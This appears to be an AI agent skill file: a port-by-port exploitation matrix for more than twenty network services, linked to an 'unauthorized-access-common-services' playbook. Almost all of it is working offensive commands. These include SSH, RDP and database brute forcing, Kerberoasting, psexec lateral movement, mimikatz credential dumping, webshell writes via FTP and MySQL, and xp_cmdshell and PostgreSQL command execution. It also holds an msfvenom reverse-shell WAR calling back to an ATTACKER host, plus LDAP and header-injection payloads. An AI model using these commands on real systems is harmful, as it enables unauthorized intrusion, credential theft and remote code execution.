---
name: port-service-matrix
description: >-
  Comprehensive service exploitation matrix organized by port number. Covers 20+ common services with enumeration, exploitation, and post-exploitation techniques for each.
---

# PORT / SERVICE EXPLOITATION MATRIX

> Supplementary reference for [unauthorized-access-common-services](./SKILL.md). Organized by port for rapid triage during service enumeration.

---

## Port 21 — FTP

```bash
# Anonymous login
ftp TARGET
> anonymous / anonymous@

# Enumerate
nmap -sV -p 21 --script=ftp-anon,ftp-bounce,ftp-syst TARGET

# PUT to webroot (if writable + mapped to web directory)
ftp TARGET
> put shell.php

# FTP bounce scan (use FTP server to port scan internal hosts)
nmap -Pn -b anonymous@FTP_SERVER INTERNAL_TARGET
```

## Port 22 — SSH

```bash
# Brute force
hydra -l root -P wordlist.txt ssh://TARGET
crackmapexec ssh TARGET -u users.txt -p passwords.txt

# Key reuse (found private key elsewhere)
ssh -i found_key user@TARGET

# Agent forwarding abuse
# If SSH_AUTH_SOCK is set on compromised host:
ssh-add -l    # list forwarded keys
ssh -A user@NEXT_TARGET   # use forwarded key to hop

# Username enumeration (CVE-2018-15473)
python3 ssh_user_enum.py TARGET -u userlist.txt
```

## Port 25 — SMTP

```bash
# Open relay test
nmap -p 25 --script smtp-open-relay TARGET

# User enumeration via VRFY/EXPN
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M EXPN -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET -D domain.com

# Header injection
# In email form: inject headers via newline
attacker@evil.com%0ACc:victim@target.com
```

## Port 53 — DNS

```bash
# Zone transfer
dig axfr @TARGET domain.com
host -l domain.com TARGET

# Subdomain brute force
gobuster dns -d domain.com -w subdomains.txt -r TARGET:53
dnsenum --dnsserver TARGET domain.com

# DNS rebinding
# Bind attacker domain to alternate between ATTACKER_IP and INTERNAL_IP
# Bypass same-origin checks to access internal services
```

## Port 80/443 — HTTP/HTTPS

See web application testing skills:
- [injection-checking](../injection-checking/SKILL.md) for input-based attacks
- [auth-sec](../auth-sec/SKILL.md) for authentication testing
- [file-access-vuln](../file-access-vuln/SKILL.md) for file operations
- [recon-and-methodology](../recon-and-methodology/SKILL.md) for web reconnaissance

## Port 88 — Kerberos

```bash
# AS-REP Roasting (no pre-auth required accounts)
GetNPUsers.py domain.com/ -usersfile users.txt -dc-ip TARGET -format hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Kerberoasting
GetUserSPNs.py domain.com/user:pass -dc-ip TARGET -request
hashcat -m 13100 tgs_hashes.txt wordlist.txt
```

See [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for full Kerberos attack playbook.

## Port 110/143 — POP3/IMAP

```bash
# Brute force
hydra -l user -P wordlist.txt pop3://TARGET
hydra -l user -P wordlist.txt imap://TARGET

# Manual POP3 login
nc TARGET 110
> USER admin
> PASS password
> LIST
> RETR 1
```

## Port 135 — MSRPC

```bash
# Endpoint enumeration
rpcdump.py TARGET
rpcmap.py 'ncacn_ip_tcp:TARGET'

# Remote execution via DCOM
dcomexec.py domain/user:pass@TARGET 'whoami'

# IOXIDResolver — network interface enumeration
IOXIDResolver.py -t TARGET
```

## Port 139/445 — SMB

```bash
# Null session enumeration
smbclient -L //TARGET -N
enum4linux -a TARGET
crackmapexec smb TARGET -u '' -p '' --shares

# Share enumeration with creds
smbmap -H TARGET -u user -p pass
crackmapexec smb TARGET -u user -p pass --shares

# EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 TARGET

# NTLM relay (see network-protocol-attacks)
ntlmrelayx.py -tf targets.txt -smb2support

# PsExec / WMIExec / SMBExec
psexec.py domain/user:pass@TARGET
wmiexec.py domain/user:pass@TARGET
smbexec.py domain/user:pass@TARGET
```

## Port 389/636 — LDAP

```bash
# Anonymous bind
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com"

# Base DN enumeration
ldapsearch -x -H ldap://TARGET -s base namingcontexts

# Dump all users
ldapsearch -x -H ldap://TARGET -D "user@domain.com" -w pass -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# LDAP injection
*)(uid=*))(|(uid=*
admin)(|(password=*
```

## Port 1433 — MSSQL

```bash
# Brute force
hydra -l sa -P wordlist.txt mssql://TARGET
crackmapexec mssql TARGET -u users.txt -p passwords.txt

# xp_cmdshell
mssqlclient.py domain/user:pass@TARGET
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Linked servers → lateral movement
SQL> SELECT * FROM openquery("LINKED_SERVER", 'select @@servername')
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]

# Credential extraction
SQL> SELECT name,password_hash FROM sys.sql_logins
```

## Port 1521 — Oracle

```bash
# TNS listener enumeration
tnscmd10g status -h TARGET
odat sidguesser -s TARGET    # brute force SIDs

# Default SIDs: XE, ORCL, ORCLCDB, PROD

# OS command execution (via Java)
odat java -s TARGET -d SID -U user -P pass --exec "whoami"

# File read/write
odat utlfile -s TARGET -d SID -U user -P pass --getFile /etc passwd
```

## Port 3306 — MySQL

```bash
# Brute force
hydra -l root -P wordlist.txt mysql://TARGET

# UDF command execution
mysql> SELECT * FROM mysql.func;   -- check existing UDFs
# Upload UDF .so → CREATE FUNCTION sys_exec RETURNS integer SONAME 'udf.so';
# mysql> SELECT sys_exec('whoami');

# File read
mysql> SELECT LOAD_FILE('/etc/passwd');

# File write (INTO OUTFILE — requires FILE privilege)
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## Port 3389 — RDP

```bash
# Brute force
hydra -l admin -P wordlist.txt rdp://TARGET
crowbar -b rdp -s TARGET/32 -u admin -C wordlist.txt

# BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 TARGET

# Session hijacking (if SYSTEM on target)
query user
tscon SESSION_ID /dest:console   # hijack without password (requires SYSTEM)

# RDP credential theft
mimikatz > ts::logonpasswords
```

## Port 5432 — PostgreSQL

```bash
# Brute force
hydra -l postgres -P wordlist.txt postgres://TARGET

# COPY command execution
psql -h TARGET -U postgres
postgres=# CREATE TABLE cmd_exec(cmd_output text);
postgres=# COPY cmd_exec FROM PROGRAM 'id';
postgres=# SELECT * FROM cmd_exec;

# Large object file read
postgres=# SELECT lo_import('/etc/passwd');
postgres=# SELECT * FROM pg_largeobject;

# Extension exploitation
postgres=# CREATE EXTENSION dblink;
```

## Port 5985/5986 — WinRM

```bash
# Evil-WinRM
evil-winrm -i TARGET -u user -p pass
evil-winrm -i TARGET -u user -H NTLM_HASH

# PowerShell remoting
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# CrackMapExec
crackmapexec winrm TARGET -u user -p pass -x 'whoami'
```

## Port 6379 — Redis

See [unauthorized-access-common-services SKILL.md §2](./SKILL.md) for full Redis exploitation (SSH key write, crontab, webshell, master-slave RCE).

```bash
# Quick check
redis-cli -h TARGET ping
redis-cli -h TARGET INFO keyspace

# Module load RCE
redis-cli -h TARGET MODULE LOAD /path/to/evil.so
redis-cli -h TARGET system.exec "id"
```

## Port 8080 — Tomcat / Jenkins

```bash
# Tomcat default credentials
# admin:admin, tomcat:tomcat, admin:password, manager:manager
curl -u tomcat:tomcat http://TARGET:8080/manager/html

# WAR deployment for RCE
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war http://TARGET:8080/manager/text/deploy?path=/shell

# Jenkins Groovy console (/script)
def cmd = "whoami".execute()
println cmd.text
```

## Port 9200 — Elasticsearch

```bash
# Check for no auth
curl http://TARGET:9200/
curl http://TARGET:9200/_cat/indices?v

# Dump all data
curl http://TARGET:9200/_search?pretty&size=1000

# Script execution (if enabled)
curl -X POST http://TARGET:9200/_search -H 'Content-Type: application/json' -d'
{"query":{"match_all":{}},"script_fields":{"cmd":{"script":"Runtime.getRuntime().exec(\"id\")"}}}'
```

## Port 27017 — MongoDB

```bash
# No auth check
mongosh --host TARGET
> show dbs
> use admin
> db.getUsers()

# Dump all collections
mongodump --host TARGET --out /tmp/mongodump/

# SSRF to admin API (MongoDB Atlas / Ops Manager)
# Internal REST API may allow user creation or config changes
```
